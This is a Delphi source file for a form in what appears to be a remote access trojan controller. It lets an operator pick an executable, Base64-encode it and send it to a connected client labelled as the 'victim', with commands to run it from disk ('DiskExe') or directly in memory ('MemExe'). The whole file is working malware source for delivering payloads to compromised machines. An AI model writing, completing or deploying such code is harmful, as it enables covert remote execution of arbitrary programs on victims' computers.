unit FrmRemoteExe;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.WinXCtrls,
  System.NetEncoding;

type
  TForm8 = class(TForm)
    GroupBox1: TGroupBox;
    RadioButton1: TRadioButton;
    RadioButton2: TRadioButton;
    ToggleSwitch1: TToggleSwitch;
    Edit1: TEdit;
    Button1: TButton;
    GroupBox2: TGroupBox;
    Edit2: TEdit;
    Button2: TButton;
    procedure RadioButton1Click(Sender: TObject);
    procedure RadioButton2Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure ToggleSwitch1Click(Sender: TObject);
  private
    { Private declarations }
  public
    ThisFormsVictimID: string;
  end;

var
  Form8: TForm8;

implementation

{$R *.dfm}

uses FrmMain;

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;

procedure TForm8.Button1Click(Sender: TObject);
var
  OpenDialog: TOpenDialog;
  bytestream: TBytesStream;
  FileStream: TFileStream;
  DataString: string;
begin
  OpenDialog := TOpenDialog.Create(nil);
  try
    if OpenDialog.Execute then
    begin
      FileStream := TFileStream.Create(OpenDialog.FileName, fmOpenRead);
      try
        bytestream := TBytesStream.Create;
        try
          bytestream.CopyFrom(FileStream, FileStream.Size);
          DataString := TNetEncoding.Base64.EncodeBytesToString
            (bytestream.Bytes);
          if ToggleSwitch1.State = tssOff then
          begin
            SendToSelectedClient(ThisFormsVictimID, 'DiskExe|' + DataString);
          end
          else if ToggleSwitch1.State = tssOn then
          begin
            SendToSelectedClient(ThisFormsVictimID, 'MemExe|' + DataString);
          end;
        finally
          bytestream.Free;
        end;
      finally
        FileStream.Free;
      end;
    end;
  finally
    OpenDialog.Free;
  end;
end;

procedure TForm8.RadioButton1Click(Sender: TObject);
begin
  if RadioButton1.Checked = true then
  begin
    GroupBox1.Enabled := true;
    GroupBox2.Enabled := False;
  end
  else if RadioButton1.Checked = False then
  begin
    GroupBox1.Enabled := False;
    GroupBox2.Enabled := true;
  end;

end;

procedure TForm8.RadioButton2Click(Sender: TObject);
begin
  if RadioButton2.Checked = true then
  begin
    GroupBox2.Enabled := true;
    GroupBox1.Enabled := False;
  end
  else if RadioButton2.Checked = False then
  begin
    GroupBox2.Enabled := False;
    GroupBox1.Enabled := true;
  end;
end;

procedure TForm8.ToggleSwitch1Click(Sender: TObject);
begin
  if ToggleSwitch1.State = tssOff then
  begin
    GroupBox2.Enabled := true;
    GroupBox1.Enabled := true;
  end
  else if ToggleSwitch1.State = tssOn then
  begin
    GroupBox2.Enabled := False;
    GroupBox1.Enabled := true;
    RadioButton1.Checked := true;
    RadioButton2.Checked := False;
  end;

end;

end.
